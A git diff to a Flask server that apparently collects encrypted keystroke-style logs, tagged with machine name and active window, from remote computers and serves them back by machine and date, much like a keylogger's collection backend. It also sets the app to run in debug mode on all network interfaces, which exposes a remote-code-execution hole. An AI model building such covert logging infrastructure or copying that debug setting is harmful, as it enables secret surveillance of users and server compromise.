@@ -1,6 +1,6 @@
 from flask import Flask, jsonify, request, redirect
 from flask_cors import CORS
-from analyze_files import save_data_with_time, read_text
+from analyze_files import save_data_with_time, read_text, get_machines
 from Encryption import encryption 
 from Encryption import decryption ,decrypt_multiple
 
@@ -9,8 +9,8 @@ import os
 
 app = Flask(__name__)
 CORS(app)
-
-computers = [{"name":"jj"}]
+DATE_FORMAT = "%Y-%m-%d"
+DATETIME_FORMAT = "%Y-%m-%d %H:%M:%S"
 
 
 @app.route('/')
@@ -20,7 +20,7 @@ def index():
 
 @app.route('/api/computers', methods=['GET'])
 def get_computers():
-    return jsonify(computers)
+    return jsonify(get_machines())
 
 @app.route('/api/data', methods=['POST'])
 def write_data():
@@ -31,29 +31,24 @@ def write_data():
     data = (decrypt_multiple(new_data["log"]))
     print(new_data["log"])
     print(data)
-    save_data_with_time(new_data["computer_name"],date_only,data)
+    save_data_with_time(new_data["computer_name"],dt,new_data["active_window"],date_only,data)
     return jsonify({
         "message": "Data saved successfully",
         "file": new_data
     }), 201
 
 
-@app.route('/api/computers', methods=['POST'])
-def add_computer():
-    new_computer = request.json
-    if any(c["id"] == new_computer["id"] for c in computers):
-        return jsonify({"error:this computer exist "}), 400
-
-    computers.append(new_computer)
-    return jsonify(new_computer), 201
-
-
 @app.route('/api/computers/<machine>', methods=['GET'])
 def get_data(machine):
+    global DATE_FORMAT
     p = request.args
-    new_text = read_text(machine,p["f_date"],p["t_date"])
-    return new_text
+    f_date = p["f_date"]
+    t_date = p["t_date"]
+    f_date = datetime.strptime(f_date,DATE_FORMAT)
+    t_date = datetime.strptime(t_date,DATE_FORMAT)
+    new_text = read_text(machine,f_date,t_date,DATE_FORMAT)
+    return jsonify(new_text)
 
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(debug=True, host="0.0.0.0")
